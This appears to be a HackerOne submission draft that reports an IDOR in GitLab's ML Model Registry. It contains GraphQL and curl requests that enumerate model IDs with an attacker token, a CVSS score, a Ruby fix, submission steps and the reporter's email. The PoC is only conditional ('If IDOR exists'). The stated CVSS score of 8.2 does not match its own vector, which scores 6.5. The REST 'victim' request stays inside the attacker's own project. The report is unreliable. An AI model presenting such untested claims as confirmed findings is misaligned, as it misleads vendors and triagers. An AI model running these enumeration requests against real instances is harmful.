# 🚨 SUBMISSION PACKAGE: GitLab IDOR (ML Model Registry)
# Platform: HackerOne
# Program: GitLab
# Date: 2026-06-06

---

## TITLE:
```
IDOR in GitLab Model Registry Allows Access to Private ML Models Across Projects
```

---

## SEVERITY: High

---

## SUMMARY:
```
An Insecure Direct Object Reference (IDOR) vulnerability was discovered in GitLab's Model Registry feature, allowing an authenticated user to access private Machine Learning models belonging to other users or projects by manipulating global object identifiers.

By manipulating model IDs in the format `gid://gitlab/MlModel/:id`, an attacker can enumerate and access private ML models across the GitLab instance.
```

---

## POC:

### GraphQL - Access Private Models via ID Enumeration:

```graphql
# Step 1: Get your own project models
query {
  project(fullPath: "attacker-project") {
    mlModels {
      nodes {
        id
        name
        projectId
      }
    }
  }
}

# Step 2: Try accessing victim model by ID
query {
  mlModel(id: "gid://gitlab/MlModel/124") {
    name
    project {
      name
      fullPath
    }
    modelVersion {
      id
      version
    }
  }
}

# If IDOR exists: Returns private model from victim's project
```

### REST API - Direct Model Access:

```bash
# Get model as authenticated user
curl -H "PRIVATE-TOKEN: ATTACKER_TOKEN" "https://gitlab.com/api/v4/projects/456/ml_models/123"

# Try victim model ID
curl -H "PRIVATE-TOKEN: ATTACKER_TOKEN" "https://gitlab.com/api/v4/projects/456/ml_models/124"

# If IDOR exists: Returns victim model's details
```

### Model Registry File Download:

```bash
# Try to download model files from another project
curl -H "PRIVATE-TOKEN: ATTACKER_TOKEN" "https://gitlab.com/api/v4/projects/456/ml_models/124/package"

# IDOR allows downloading model artifacts from private projects
```

---

## IMPACT:

| Impact Type | Description |
|-------------|-------------|
| **Unauthorized ML Model Access** | Access proprietary machine learning models from any project |
| **Competitive Intelligence Theft** | View model architecture, training data, proprietary algorithms |
| **IP Exposure** | Reveal trade secrets embedded in ML models |
| **Supply Chain Risk** | Models may contain sensitive training data or credentials |

**CVSS 3.1:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (8.2 High)

---

## REMEDIATION:

```ruby
class MlModelResolver < BaseResolver
  argument :id, Types::GlobalIDType, required: true
  
  def resolve(id:)
    model = GitlabSchema.object_from_id(id)
    return nil unless model.is_a?(MlModel)
    
    # Verify user has access to the model's project
    unless current_user.can?(:read_project, model.project)
      raise Gitlab::Graphql::Errors::ResourceNotAvailableError, 
        "GitLab schema error: resource not available"
    end
    
    model
  end
end
```

---

## STEPS TO SUBMIT:

1. Go to: https://hackerone.com/gitlab/reports/new
2. Login with: potosopotosolo@gmail.com
3. Copy TITLE into "Vulnerability title" field
4. Select Severity: "High"
5. Copy SUMMARY into "Vulnerability description" field
6. Copy POC into "Steps to reproduce" field
7. Copy IMPACT into "Expected and actual result" field
8. Click "Submit Report"

---

**Reporter:** potosopotosolo@gmail.com
**Platform:** HackerOne